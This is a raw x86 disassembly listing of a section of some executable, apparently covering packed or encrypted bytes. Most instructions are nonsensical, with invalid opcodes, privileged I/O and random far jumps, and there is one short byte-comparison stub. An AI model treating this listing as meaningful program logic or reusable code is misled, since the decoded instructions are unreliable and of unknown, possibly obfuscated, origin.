  40c40d:	adc    DWORD PTR [ebp+0x5aaf2c5e],esp
  40c413:	pop    ebx
  40c414:	mov    ch,cl
  40c416:	loop   0x40c493
  40c418:	cld    
  40c419:	mov    bl,BYTE PTR [esi]
  40c41b:	push   eax
  40c41c:	loop   0x40c466
  40c41e:	dec    edx
  40c41f:	mov    ds:0xb6bb6c70,eax
  40c424:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c425:	sub    eax,0x91309651
  40c42a:	loop   0x40c3bf
  40c42c:	test   BYTE PTR [ebp+ebp*1-0x35],al
  40c430:	into   
  40c431:	retf   
  40c432:	or     al,0x71
  40c434:	adc    DWORD PTR [ebx-0x48],ecx
  40c437:	mov    DWORD PTR [edx+0x78],0xa27e9f34
  40c43e:	iret   
  40c43f:	sub    BYTE PTR ds:[edi+0x34de29c2],bl
  40c446:	loope  0x40c4b0
  40c448:	mov    dh,0x8a
  40c44a:	add    DWORD PTR [ebp+eiz*8-0x39],ebp
  40c44e:	imul   esp,ecx,0x46
  40c451:	sbb    ebx,edx
  40c453:	dec    ebp
  40c454:	mov    bl,0xf2
  40c456:	add    al,0xd5
  40c458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c459:	sti    
  40c45a:	(bad)  
  40c45c:	sbb    cl,ch
  40c45e:	cld    
  40c45f:	fadd   QWORD PTR [ecx-0x35]
  40c462:	sar    ch,cl
  40c464:	cmp    DWORD PTR [esi-0x551f40d1],edx
  40c46a:	mov    BYTE PTR ds:0x3537330,dh
  40c470:	inc    edi
  40c471:	pushf  
  40c472:	aam    0x79
  40c474:	jg     0x40c3f7
  40c476:	adc    eax,0x7ff3371f
  40c47b:	outs   dx,DWORD PTR ds:[esi]
  40c47c:	sti    
  40c47d:	into   
  40c47e:	xchg   esp,eax
  40c47f:	loope  0x40c488
  40c481:	shl    dl,1
  40c483:	imul   edx,DWORD PTR [eax-0x5cf22ee],0xffffffab
  40c48a:	sub    dh,BYTE PTR cs:[ebp-0x35]
  40c48e:	xor    edi,DWORD PTR [esi-0x4b441fe2]
  40c494:	leave  
  40c495:	les    esi,FWORD PTR [edi+0x6f86a18f]
  40c49b:	(bad)  
  40c49c:	(bad)  
  40c49d:	icebp  
  40c49e:	push   esp
  40c49f:	je     0x40c4fc
  40c4a1:	aas    
  40c4a2:	mov    WORD PTR cs:[esi-0x39ebc009],gs
  40c4a9:	retf   
  40c4aa:	cmp    dh,BYTE PTR [edi]
  40c4ac:	xor    bl,BYTE PTR [ebp-0x5285e297]
  40c4b2:	cdq    
  40c4b3:	stos   BYTE PTR es:[edi],al
  40c4b4:	fbld   TBYTE PTR [ecx]
  40c4b6:	sahf   
  40c4b7:	inc    edx
  40c4b8:	cmp    BYTE PTR fs:[ebx+0x55],0x8
  40c4bd:	mov    dh,0xcd
  40c4bf:	xchg   ebx,eax
  40c4c0:	push   esi
  40c4c1:	xchg   esi,eax
  40c4c2:	adc    edi,DWORD PTR [ebp+0x14]
  40c4c5:	cwde   
  40c4c6:	stos   BYTE PTR es:[edi],al
  40c4c7:	lahf   
  40c4c8:	sub    dl,BYTE PTR [edi]
  40c4ca:	inc    ebx
  40c4cb:	inc    eax
  40c4cc:	int3   
  40c4cd:	mov    dh,0xfb
  40c4cf:	(bad)  
  40c4d0:	lock call 0x10ee1442
  40c4d6:	jmp    0xa499c4e7
  40c4db:	aaa    
  40c4dc:	dec    edx
  40c4dd:	jle    0x40c4f2
  40c4df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4e0:	inc    edi
  40c4e1:	xor    DWORD PTR [ebx],eax
  40c4e3:	pushf  
  40c4e4:	rcr    DWORD PTR ds:0x8581679b,0x3d
  40c4eb:	xchg   edx,eax
  40c4ec:	pop    esi
  40c4ed:	xor    bh,bh
  40c4ef:	cld    
  40c4f0:	hlt    
  40c4f1:	dec    esp
  40c4f2:	push   0x3e7fb5ba
  40c4f7:	pop    esp
  40c4f8:	jle    0x40c51f
  40c4fa:	bound  ecx,QWORD PTR [esi]
  40c4fc:	lahf   
  40c4fd:	xchg   esi,eax
  40c4fe:	or     al,0x28
  40c500:	leave  
  40c501:	jmp    FWORD PTR [esi+edx*1+0x67b34925]
  40c508:	ror    dl,0xae
  40c50b:	xchg   DWORD PTR [eax-0x6e42c7ad],edx
  40c511:	pop    eax
  40c512:	loop   0x40c4c6
  40c514:	cmp    eax,0xfb4f7770
  40c519:	popa   
  40c51a:	or     bh,BYTE PTR [eax-0x15ca197]
  40c520:	push   ecx
  40c521:	add    BYTE PTR [edx-0x64],ah
  40c524:	mov    ds:0xc75da6cb,eax
  40c529:	js     0x40c4d5
  40c52b:	hlt    
  40c52c:	scas   eax,DWORD PTR es:[edi]
  40c52d:	mov    esp,0x59c32b1f
  40c532:	add    al,0xb2
  40c534:	mov    ebp,0x60c90992
  40c539:	imul   ebp,esi,0xc
  40c53c:	xor    BYTE PTR [ebx],ah
  40c53e:	push   eax
  40c53f:	sbb    ah,cl
  40c541:	(bad)  
  40c542:	repnz stos DWORD PTR es:[edi],eax
  40c544:	mov    BYTE PTR [ecx],al
  40c546:	dec    esi
  40c547:	push   edx
  40c548:	cwde   
  40c549:	jbe    0x40c59a
  40c54b:	arpl   WORD PTR [ebx],si
  40c54d:	xor    al,0x78
  40c54f:	out    dx,eax
  40c550:	repnz stc 
  40c552:	outs   dx,BYTE PTR ds:[esi]
  40c553:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c554:	or     eax,0x4bce57a6
  40c559:	imul   esi,ecx,0xeffe5c5e
  40c55f:	je     0x40c520
  40c561:	sub    DWORD PTR [ecx+ebp*8],edi
  40c564:	dec    esp
  40c565:	aaa    
  40c566:	(bad)
  40c569:	scas   eax,DWORD PTR es:[edi]
  40c56a:	ins    DWORD PTR es:[edi],dx
  40c56b:	jns    0x40c598
  40c56d:	js     0x40c5a4
  40c56f:	lods   eax,DWORD PTR ds:[esi]
  40c570:	sar    DWORD PTR [eax+eiz*4-0x58],0xaf
  40c575:	mov    ds,WORD PTR [edx+0x5bd15379]
  40c57b:	or     eax,0x7c43d37e
  40c580:	into   
  40c581:	out    dx,eax
  40c582:	inc    ebp
  40c583:	call   0xfe015144
  40c588:	jmp    0x1fd4:0x9de2d771
  40c58f:	push   edi
  40c590:	cmp    BYTE PTR ds:[ebx],bh
  40c593:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c594:	xor    edi,DWORD PTR [ecx-0x54]
  40c597:	stc    
  40c598:	xor    bh,0x21
  40c59b:	xchg   edi,eax
  40c59c:	xor    eax,0xcd28e5f4
  40c5a1:	lods   eax,DWORD PTR ds:[esi]
  40c5a2:	into   
  40c5a3:	mov    ds:0x96189c23,al
  40c5a8:	or     BYTE PTR [ebx-0x1dc9076f],ch
  40c5ae:	xchg   DWORD PTR [ebx+0x32df2997],esi
  40c5b4:	or     BYTE PTR ds:0xae41e4c9,0xb6
  40c5bb:	mov    ?,WORD PTR [ebx]
  40c5bd:	fiadd  WORD PTR [ebx]
  40c5bf:	loop   0x40c5f7
  40c5c1:	push   0xffffff83
  40c5c3:	leave  
  40c5c4:	hlt    
  40c5c5:	lock add DWORD PTR [ebx+0x44f10b],0x28
  40c5cd:	or     cl,al
  40c5cf:	test   eax,0xd8d1004b
  40c5d4:	cmp    eax,0x7a43279b
  40c5d9:	dec    esp
  40c5da:	cld    
  40c5db:	ins    BYTE PTR es:[edi],dx
  40c5dc:	dec    ecx
  40c5dd:	mov    bh,0xfd
  40c5df:	ds xor al,0x3d
  40c5e2:	sbb    BYTE PTR [ecx],cl
  40c5e4:	loope  0x40c59e
  40c5e6:	inc    ebx
  40c5e7:	inc    esi
  40c5e8:	pop    ecx
  40c5e9:	retf   
  40c5ea:	icebp  
  40c5eb:	pop    es
  40c5ec:	retf   
  40c5ed:	add    dl,BYTE PTR [ecx]
  40c5ef:	mov    WORD PTR [edx],ds
  40c5f1:	sahf   
  40c5f2:	(bad)
  40c5f5:	jmp    edi
  40c5f7:	cs das 
  40c5f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5fa:	sub    al,0x8b
  40c5fc:	and    BYTE PTR [esi+0x19738fb5],ah
  40c602:	mov    ecx,0x7cbec947
  40c607:	xor    dh,bh
  40c609:	mov    edi,0x3c6e2946
  40c60e:	call   0xb6996c60
  40c613:	cmp    dh,bl
  40c615:	outs   dx,BYTE PTR ds:[esi]
  40c616:	(bad)  
  40c617:	(bad)  
  40c618:	ror    ebx,cl
  40c61a:	mov    dh,0x9f
  40c61c:	add    al,0xab
  40c61e:	cdq    
  40c61f:	stos   BYTE PTR es:[edi],al
  40c620:	jno    0x40c607
  40c622:	add    ch,BYTE PTR [eax+0x43eb2969]
  40c628:	imul   esp,ebx,0x67
  40c62b:	pushf  
  40c62c:	sub    eax,DWORD PTR [ecx-0x3a]
  40c62f:	(bad)  
  40c630:	(bad)  
  40c631:	xchg   esp,eax
  40c632:	mov    dl,0xc8
  40c634:	pop    eax
  40c635:	inc    eax
  40c636:	fcom   DWORD PTR [ebx-0x15937d80]
  40c63c:	pop    ds
  40c63d:	loop   0x40c657
  40c63f:	sbb    bl,bh
  40c641:	shl    DWORD PTR [eax],cl
  40c643:	aad    0x71
  40c645:	cs jmp 0x6769:0x80d6d939
  40c64d:	mov    dl,0x52
  40c64f:	sbb    esp,DWORD PTR [ebx-0xc]
  40c652:	and    esp,DWORD PTR [edi+0x6ef1e184]
  40c658:	retf   0x9c0f
  40c65b:	pop    eax
  40c65c:	mov    edx,DWORD PTR [ebx+0xece3cc1]
  40c662:	in     eax,0xb6
  40c664:	arpl   WORD PTR [ebp-0x46],dx
  40c667:	cmc    
  40c668:	cld    
  40c669:	mov    ds:0x1d1c74c6,al
  40c66e:	sti    
  40c66f:	mov    ecx,0x7cdfa0ef
  40c674:	sub    dh,BYTE PTR [esi]
  40c676:	out    dx,al
  40c677:	inc    esp
  40c678:	xchg   ecx,edi
  40c67a:	and    bh,al
  40c67c:	xchg   ebp,eax
  40c67d:	sub    eax,0x2feb38a
  40c682:	and    ecx,DWORD PTR [eax-0x71ca3de8]
  40c688:	fstp   DWORD PTR [edi]
  40c68a:	cli    
  40c68b:	fwait
  40c68c:	jae    0x40c667
  40c68e:	mov    WORD PTR [ebp+0x71],fs
  40c691:	pop    ecx
  40c692:	pop    ebx
  40c693:	aam    0x48
  40c695:	in     eax,dx
  40c696:	shl    BYTE PTR [eax+0x58],1
  40c699:	out    dx,eax
  40c69a:	inc    edi
  40c69c:	adc    cl,dl
  40c69e:	ss leave 
  40c6a0:	lods   al,BYTE PTR ds:[esi]
  40c6a1:	xchg   esp,eax
  40c6a2:	fs add al,0xfa
  40c6a5:	xor    al,0xf9
  40c6a7:	push   0xffffffbd
  40c6a9:	data16 sub BYTE PTR [esi-0x4ed07022],bh
  40c6b0:	nop
  40c6b1:	loop   0x40c664
  40c6b3:	fcmovne st,st(6)
  40c6b5:	shl    BYTE PTR [ebx-0x61],0xe5
  40c6b9:	hlt    
  40c6ba:	stos   DWORD PTR es:[edi],eax
  40c6bb:	loope  0x40c6c4
  40c6bd:	mov    al,ds:0x1dba44ef
  40c6c2:	or     ecx,DWORD PTR [ebp+0x2b]
  40c6c5:	pop    edx
  40c6c6:	sti    
  40c6c7:	dec    ebp
  40c6c8:	jae    0x40c6f7
  40c6ca:	mov    dh,0xf9
  40c6cc:	daa    
  40c6cd:	out    0xb4,eax
  40c6cf:	inc    ecx
  40c6d0:	mov    ah,0x53
  40c6d2:	mov    esi,DWORD PTR [edx-0x79]
  40c6d5:	mov    cl,0x9a
  40c6d7:	or     ebx,eax
  40c6d9:	mov    ch,0xfc
  40c6db:	adc    eax,0xa8c11f83
  40c6e0:	cmc    
  40c6e1:	call   0x3017e265
  40c6e6:	jae    0x40c6a5
  40c6e8:	in     al,0x40
  40c6ea:	xlat   BYTE PTR ds:[ebx]
  40c6eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6ec:	push   ecx
  40c6ed:	jnp    0x40c6f4
  40c6ef:	mov    ss,WORD PTR [ebx-0x56228dde]
  40c6f5:	cmp    eax,0xd2ff80dc
  40c6fa:	pop    ebp
  40c6fb:	fwait
  40c6fc:	lods   al,BYTE PTR ds:[esi]
  40c6fd:	jae    0x40c6db
  40c6ff:	imul   eax,DWORD PTR [ecx],0x3f547ea1
  40c705:	out    dx,al
  40c706:	adc    al,0x29
  40c708:	jmp    0x4aab512b
  40c70d:	test   eax,0x3705ba36
  40c712:	jne    0x40c6c1
  40c714:	ins    DWORD PTR es:[edi],dx
  40c715:	add    al,bl
  40c717:	or     eax,0x922bbb2a
  40c71c:	add    ecx,DWORD PTR [ebp+0x1b]
  40c71f:	jle    0x40c6dc
  40c721:	dec    ebp
  40c722:	mov    ebx,0xca17c79d
  40c727:	xor    BYTE PTR [eax],ah
  40c729:	(bad)  
  40c72a:	push   0x3d
  40c72c:	shr    BYTE PTR cs:[ebx],0x45
  40c730:	das    
  40c731:	or     BYTE PTR [edi-0x32],cl
  40c734:	sbb    bl,BYTE PTR [eax]
  40c736:	dec    ebp
  40c737:	adc    al,0x38
  40c739:	jl     0x40c6e0
  40c73b:	(bad)  
  40c73c:	jnp    0x40c6ed
  40c73e:	popa   
  40c73f:	mov    al,ds:0xfddda0c2
  40c744:	ds pusha 
  40c746:	xchg   DWORD PTR [eax+0x77],esp
  40c749:	dec    eax
  40c74a:	leave  
  40c74b:	sbb    ah,0x77
  40c74e:	fmul   DWORD PTR [esi]
  40c750:	dec    ecx
  40c751:	loope  0x40c73a
  40c753:	iret   
  40c754:	and    eax,0xd211fc9a
  40c759:	cwde   
  40c75a:	sub    DWORD PTR [ebx-0x23],edi
  40c75d:	jl     0x40c788
  40c75f:	pop    edx
  40c760:	fisttp WORD PTR [edi+0x280968b2]
  40c766:	std    
  40c767:	data16 daa 
  40c769:	inc    esi
  40c76a:	lahf   
  40c76b:	data16 jae 0x40c73b
  40c76e:	in     al,dx
  40c76f:	xor    cl,BYTE PTR [ebp-0x2a]
  40c772:	adc    DWORD PTR [eax],ecx
  40c774:	loope  0x40c729
  40c776:	adc    ebp,DWORD PTR [edi]
  40c778:	aas    
  40c779:	pop    ds
  40c77a:	dec    esp
  40c77b:	aas    
  40c77c:	xchg   ebp,eax
  40c77d:	fxch   st(6)
  40c77f:	mov    al,es:0x8bcdbfd0
  40c785:	(bad)  
  40c787:	push   0x1c
  40c789:	mov    esi,0x3d690288
  40c78e:	dec    ebp
  40c78f:	ja     0x40c7fd
  40c791:	iret   
  40c792:	(bad)  
  40c793:	xlat   BYTE PTR ds:[ebx]
  40c794:	dec    ebp
  40c795:	popf   
  40c796:	jle    0x40c79c
  40c798:	call   0x1a59bf8
  40c79d:	je     0x40c770
  40c79f:	sub    DWORD PTR [esi+ebx*2+0xb],esi
  40c7a3:	xchg   DWORD PTR [ebx+0x4efff337],edx
  40c7a9:	push   esi
  40c7aa:	mov    esp,?
  40c7ac:	test   DWORD PTR [ebp-0x2b0ef977],esp
  40c7b2:	and    dh,dl
  40c7b4:	pop    es
  40c7b5:	xor    al,0x42
  40c7b7:	add    al,dl
  40c7b9:	push   0x6
  40c7bb:	add    eax,0xfa
  40c7c0:	mov    BYTE PTR [ebp-0x4],al
  40c7c3:	mov    BYTE PTR [ebp-0x3],0x67
  40c7c7:	pop    eax
  40c7c8:	mov    BYTE PTR [ebp-0x1],al
  40c7cb:	mov    BYTE PTR [ebp-0x2],0x3
  40c7cf:	mov    dl,BYTE PTR [ebp-0x2]
  40c7d2:	movzx  esi,dl
  40c7d5:	cdq    
  40c7d6:	idiv   esi
  40c7d8:	mov    dl,BYTE PTR [ebp-0x1]
  40c7db:	add    al,dl
  40c7dd:	mov    dl,BYTE PTR [ebp-0x3]
  40c7e0:	or     al,dl
  40c7e2:	mov    dl,BYTE PTR [ebp-0x4]
  40c7e5:	add    al,0x3a
  40c7e7:	cmp    dl,al
  40c7e9:	jmp    0x40cbdf
  40c7ee:	xchg   esi,eax
  40c7ef:	and    al,dl
  40c7f1:	cmc    
  40c7f2:	mov    ds:0xdc222674,al
  40c7f7:	mov    cl,BYTE PTR [edi+0x69056a70]
  40c7fd:	mov    esp,0x1818f563
  40c802:	outs   dx,BYTE PTR ds:[esi]
  40c803:	adc    bl,BYTE PTR [eax]
  40c805:	sbb    BYTE PTR [eax],bh
  40c807:	scas   al,BYTE PTR es:[edi]
  40c808:	push   ecx
  40c809:	fbld   TBYTE PTR [eax]
  40c80b:	mov    esp,0xc54d7abc
  40c810:	scas   eax,DWORD PTR es:[edi]
  40c811:	bound  ebp,QWORD PTR [esi-0x16]
  40c814:	ror    BYTE PTR [ecx+0x3b],1
  40c817:	pop    edx
  40c818:	in     eax,0xf3
  40c81a:	cmp    eax,0x5d4396ea
  40c81f:	xor    dh,BYTE PTR [ecx]
  40c821:	lods   al,BYTE PTR ds:[esi]
  40c822:	js     0x40c7ba
  40c824:	ror    DWORD PTR [edx+0x6e],1
  40c827:	dec    ecx
  40c828:	mov    eax,0xb07fb1d1
  40c82d:	dec    ecx
  40c82e:	shl    eax,0x15
  40c831:	jns    0x40c880
  40c833:	rcr    DWORD PTR [eax],cl
  40c835:	push   ebp
  40c836:	in     eax,dx
  40c837:	clc    
  40c838:	mov    al,ds:0x17a5ebeb
  40c83d:	popa   
  40c83e:	xchg   ecx,eax
  40c83f:	test   al,0x89
  40c841:	int3   
  40c842:	(bad)  
  40c843:	push   eax
  40c844:	xor    edi,DWORD PTR [esi]
  40c846:	inc    BYTE PTR [edx+0x7c]
  40c849:	retf   
  40c84a:	fcmovne st,st(0)
  40c84c:	fisttp QWORD PTR [edx]
  40c84e:	in     eax,dx
  40c84f:	or     BYTE PTR [ecx],ah
  40c851:	call   0x79f41a29
  40c856:	push   ebp
  40c857:	test   BYTE PTR [edi+0x60da9f09],bh
  40c85d:	int    0xbb
  40c85f:	daa    
  40c860:	js     0x40c811
  40c862:	sub    DWORD PTR [edi+0x28],ebp
  40c865:	shl    edx,cl
  40c867:	inc    eax
  40c868:	mov    dl,0x23
  40c86a:	sahf   
  40c86b:	xchg   BYTE PTR [edx],cl
  40c86d:	dec    edx
  40c86e:	mov    ebp,ebx
  40c870:	pop    ecx
  40c871:	(bad)  
  40c873:	or     ebp,DWORD PTR [edx]
  40c875:	neg    edi
  40c877:	fcomp  DWORD PTR [ebx-0x48]
  40c87a:	dec    ebx
  40c87b:	jmp    0x40c8f5
  40c87d:	sbb    BYTE PTR [ecx],bl
  40c87f:	cdq    
  40c880:	xchg   BYTE PTR [edx+0x18edd3d5],al
  40c886:	adc    ebp,DWORD PTR [edx]
  40c888:	dec    edx
  40c889:	call   0x79c7:0xb026e37d
  40c890:	jno    0x40c838
  40c892:	and    bh,BYTE PTR [edi-0x23]
  40c895:	mov    ds:0x127b84b9,al
  40c89a:	sar    BYTE PTR [ecx+0x303c275],cl
  40c8a0:	jae    0x40c913
  40c8a2:	push   esp
  40c8a3:	clc    
  40c8a4:	call   DWORD PTR [esi-0x709f107]
  40c8aa:	cmp    DWORD PTR [ecx-0xe7577b2],esi
  40c8b0:	sub    eax,0xe27ac
  40c8b5:	psrlw  mm3,mm6
  40c8b8:	cmp    bl,BYTE PTR [ebp+0x32d0efaf]
  40c8be:	popa   
  40c8bf:	shld   DWORD PTR [edx],ebx,cl
  40c8c2:	cmp    ch,BYTE PTR [ecx-0x5e1a7a54]
  40c8c8:	xchg   edx,eax
  40c8c9:	fistp  WORD PTR [edx]
  40c8cb:	mov    al,0xe1
  40c8cd:	xor    al,0xcb
  40c8cf:	loop   0x40c900
  40c8d1:	dec    edi
  40c8d2:	and    al,0x4f
  40c8d4:	and    eax,0x89de32ad
  40c8d9:	xor    cl,dh
  40c8db:	hlt    
  40c8dc:	jne    0x40c916
  40c8de:	push   ds
  40c8df:	int3   
  40c8e0:	rcl    al,cl
  40c8e2:	xchg   DWORD PTR [eax],esi
  40c8e4:	not    BYTE PTR [esi]
  40c8e6:	stos   BYTE PTR es:[edi],al
  40c8e7:	pop    edx
  40c8e8:	sbb    ah,bh
  40c8ea:	xor    al,0x6
  40c8ec:	sbb    DWORD PTR [esi-0x7ddf87b1],ecx
  40c8f2:	repz ret 
  40c8f4:	mov    bl,0xfb
  40c8f6:	loope  0x40c8b4
  40c8f8:	dec    edi
  40c8f9:	add    cl,BYTE PTR [ebx-0x78]
  40c8fc:	xor    BYTE PTR [esp+ecx*1],al
  40c8ff:	aad    0x5f
  40c901:	in     al,dx
  40c902:	add    BYTE PTR [ebx-0x58dce9a7],bl
  40c908:	dec    ecx
  40c909:	add    ebp,DWORD PTR [ebx+0x23]
  40c90c:	sbb    bl,0xbc
  40c90f:	or     bh,BYTE PTR [edi+eiz*1-0x21]
  40c913:	push   eax
  40c914:	or     BYTE PTR [ebx],0x98
  40c917:	stos   BYTE PTR es:[edi],al
  40c918:	inc    ecx
  40c919:	test   eax,0x8463968
  40c91e:	xchg   ecx,eax
  40c91f:	xchg   ebx,eax
  40c920:	sub    cl,ah
  40c922:	xor    ecx,DWORD PTR [esi+0x6d]
  40c925:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c926:	jge    0x40c920
  40c928:	outs   dx,BYTE PTR ds:[esi]
  40c929:	push   cs
  40c92a:	(bad)  
  40c92b:	mov    bl,BYTE PTR [edi+ecx*2]
  40c92e:	sbb    edi,DWORD PTR [edx+ecx*4+0x71602a70]
  40c935:	dec    esi
  40c936:	lods   eax,DWORD PTR ds:[esi]
  40c937:	cmp    eax,0xd316b5fd
  40c93c:	adc    bh,BYTE PTR ds:0x4ddbfde9
  40c942:	pop    ebp
  40c943:	mov    ecx,0xbbe46f3e
  40c948:	(bad)  
  40c949:	jmp    0x40c9aa
  40c94b:	xor    al,0x2d
  40c94d:	stc    
  40c94e:	add    bh,bl
  40c950:	popf   
  40c951:	dec    edi
  40c952:	sbb    eax,0xcd8bc0b7
  40c957:	inc    esi
  40c958:	dec    eax
  40c959:	scas   al,BYTE PTR es:[edi]
  40c95a:	push   ss
  40c95b:	stos   DWORD PTR es:[edi],eax
  40c95c:	cmp    eax,0xf84a20c6
  40c961:	jne    0x40c907
  40c963:	xchg   DWORD PTR [ecx],ebx
  40c965:	mov    ds:0x15cfe4ab,eax
  40c96a:	outs   dx,DWORD PTR ds:[esi]
  40c96b:	xchg   esi,eax
  40c96c:	push   ecx
  40c96d:	daa    
  40c96e:	nop
  40c96f:	outs   dx,DWORD PTR ds:[esi]
  40c970:	pop    edx
  40c971:	stos   BYTE PTR es:[edi],al
  40c972:	push   esp
  40c973:	daa    
  40c974:	pop    ebp
  40c975:	int3   
  40c976:	cmc    
  40c977:	pop    ebx
  40c978:	push   eax
  40c979:	add    al,0x9
  40c97b:	mov    cl,0xd
  40c97d:	pop    es
  40c97e:	jmp    0x49cd:0xdbe96066
  40c985:	mov    edi,0x3856c894
  40c98a:	mov    ecx,0xdfb0074d
  40c98f:	out    dx,eax
  40c990:	and    eax,0xe5f7bf16
  40c995:	mov    bh,0xe5
  40c997:	fs dec edi
  40c999:	push   0xb9bf96d5
  40c99e:	rol    BYTE PTR [edx+0x32],1
  40c9a1:	pop    ebx
  40c9a2:	loop   0x40c9ef
  40c9a4:	mov    esi,0xe8190433
  40c9a9:	push   ecx
  40c9aa:	and    ebx,DWORD PTR [ebx]
  40c9ac:	scas   eax,DWORD PTR es:[edi]
  40c9ad:	pop    edx
  40c9ae:	into   
  40c9af:	dec    ecx
  40c9b0:	pop    es
  40c9b1:	retf   0x92d5
  40c9b4:	dec    ebx
  40c9b5:	aas    
  40c9b6:	cmc    
  40c9b7:	scas   al,BYTE PTR es:[edi]
  40c9b8:	cmc    
  40c9b9:	xchg   ebx,eax
  40c9ba:	adc    eax,0x63da9e0a
  40c9bf:	stos   DWORD PTR es:[edi],eax
  40c9c0:	cli    
  40c9c1:	xor    ah,BYTE PTR [eax+0x76c24d4c]
  40c9c7:	je     0x40c9d1
  40c9c9:	popf   
  40c9ca:	or     al,0x71
  40c9cc:	mul    BYTE PTR [esi-0x2658cf2f]
  40c9d2:	in     al,dx
  40c9d3:	ret    0x8ff
  40c9d6:	mov    ecx,0xff906cff
  40c9db:	fwait
  40c9dc:	es jmp 0x40ca5c
  40c9df:	test   al,0x44
  40c9e1:	dec    eax
  40c9e2:	jg     0x40c97c
  40c9e4:	jge    0x40ca05
  40c9e6:	mov    ebx,0x3b36e6b8
  40c9eb:	leave  
  40c9ec:	in     eax,0x89
  40c9ee:	test   DWORD PTR [ecx+0x44b83950],esp
  40c9f4:	adc    eax,0xebdf407c
  40c9f9:	mov    ebp,0x57fb225f
  40c9fe:	rol    DWORD PTR [ecx],1
  40ca00:	pop    ebx
  40ca01:	xchg   DWORD PTR [ecx-0x17],ebx
  40ca04:	inc    esp
  40ca05:	add    eax,0x6bc8937a
  40ca0a:	scas   al,BYTE PTR es:[edi]
  40ca0b:	mov    edi,0x4cd7ff06
  40ca10:	push   eax
  40ca11:	and    DWORD PTR [esi+ebp*8-0x5e],edx
  40ca15:	loope  0x40c9cb
  40ca17:	xlat   BYTE PTR ds:[ebx]
  40ca18:	sbb    al,0xa7
  40ca1a:	sub    dl,BYTE PTR [ecx-0x2a93fcee]
  40ca20:	mov    al,0x2b
  40ca22:	mov    ah,BYTE PTR [edi+0x5fd51b8f]
  40ca28:	lahf   
  40ca29:	jmp    0x40ca84
  40ca2b:	mov    edi,0x45e302df
  40ca30:	div    DWORD PTR [edx-0x4142493a]
  40ca36:	mov    ecx,0xb5041c87
  40ca3b:	(bad)  
  40ca3c:	mov    bh,0x89
  40ca3e:	inc    esp
  40ca3f:	(bad)  
  40ca40:	(bad)  
  40ca41:	stos   BYTE PTR es:[edi],al
  40ca42:	cs pop ds
  40ca44:	xchg   BYTE PTR [ebx-0x5043651a],bl
  40ca4a:	and    eax,0x87068584
  40ca4f:	mov    bl,0xf8
  40ca51:	adc    ecx,DWORD PTR [eax-0x26]
  40ca54:	xlat   BYTE PTR ds:[ebx]
  40ca55:	mov    dl,0x16
  40ca57:	and    ch,bh
  40ca59:	nop
  40ca5a:	cli    
  40ca5b:	ret    
  40ca5c:	sbb    al,0xc9
  40ca5e:	ja     0x40ca01
  40ca60:	inc    edi
  40ca61:	jecxz  0x40ca73
  40ca63:	inc    edx
  40ca64:	icebp  
  40ca65:	sti    
  40ca66:	jl     0x40ca63
  40ca68:	jne    0x40cabc
  40ca6a:	mov    cl,0xfd
  40ca6c:	ror    edi,1
  40ca6e:	sub    eax,0x3bcf207b
  40ca73:	aam    0xc6
  40ca75:	xor    ch,BYTE PTR [ecx]
  40ca77:	mov    ecx,0x5977613
  40ca7c:	cmp    DWORD PTR [eax],edi
  40ca7e:	inc    edi
  40ca7f:	push   ss
  40ca80:	test   ah,ch
  40ca82:	fisubr WORD PTR [ecx+0x27bb1920]
  40ca88:	mov    ds:0x1eea1e09,eax
  40ca8d:	(bad)  
  40ca8e:	stc    
  40ca8f:	ficomp WORD PTR ds:0x38134578
  40ca95:	inc    esi
  40ca96:	repnz aam 0x2b
  40ca99:	rcl    al,1
  40ca9b:	mov    ch,0x82
  40ca9d:	stos   BYTE PTR es:[edi],al
  40ca9e:	dec    esi
  40ca9f:	xchg   DWORD PTR [ebx+0x5641fb87],ebx
  40caa5:	pop    es
  40caa6:	or     ecx,edx
  40caa8:	or     ebx,esi
  40caaa:	sbb    dh,BYTE PTR [edi+0x1f26069e]
  40cab0:	leave  
  40cab1:	dec    ecx
  40cab2:	add    eax,0xb1e4971b
  40cab7:	jmp    0x40cb01
  40cab9:	mov    al,ds:0x6ae3ec8
  40cabe:	xchg   ah,bl
  40cac0:	mov    bl,0x72
  40cac2:	in     eax,0xa2
  40cac4:	jb     0x40ca61
  40cac6:	das    
  40cac7:	aaa    
  40cac8:	pop    eax
  40cac9:	mov    esi,0xa574ac4a
  40cace:	icebp  
  40cacf:	lods   eax,DWORD PTR ds:[esi]
  40cad0:	mov    es,WORD PTR [eax-0x2d388745]
  40cad6:	dec    ebp
  40cad7:	in     al,dx
  40cad8:	adc    al,0xae
  40cada:	jne    0x40cb13
  40cadc:	outs   dx,DWORD PTR ds:[esi]
  40cadd:	lods   al,BYTE PTR ds:[esi]
  40cade:	sub    edi,ebx
  40cae0:	xchg   edx,eax
  40cae1:	int3   
  40cae2:	repz mov ah,0x9b
  40cae5:	paddd  mm3,QWORD PTR [esi-0x580363f9]
  40caec:	inc    ebx
  40caed:	por    mm7,QWORD PTR [esp+esi*1-0x38]
  40caf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40caf3:	daa    
  40caf4:	sub    al,0xb1
  40caf6:	mov    eax,0xcbf44670
  40cafb:	push   ds
  40cafc:	jo     0x40cb2e
  40cafe:	or     BYTE PTR [edx+0x4bc7ea12],dh
  40cb04:	add    ebx,DWORD PTR [edi]
  40cb06:	jge    0x40caaf
  40cb08:	pop    esi
  40cb09:	nop
  40cb0a:	push   ss
  40cb0b:	aas    
  40cb0c:	dec    ecx
  40cb0d:	pushf  
  40cb0e:	xchg   esp,eax
  40cb0f:	lds    ebx,FWORD PTR [edi+0x6f191fc1]
  40cb15:	in     al,0xaa
  40cb17:	pop    ebp
  40cb18:	adc    ebp,edi
  40cb1a:	lock stos BYTE PTR es:[edi],al
  40cb1c:	or     DWORD PTR [ebx],0x977bf373
  40cb22:	dec    edx
  40cb23:	scas   eax,DWORD PTR es:[edi]
  40cb24:	fs (bad) 
  40cb27:	sub    DWORD PTR [edx],edi
  40cb29:	dec    ebp
  40cb2a:	dec    edi
  40cb2b:	int3   
  40cb2c:	push   ebp
  40cb2d:	and    DWORD PTR [eax+0x46],ebx
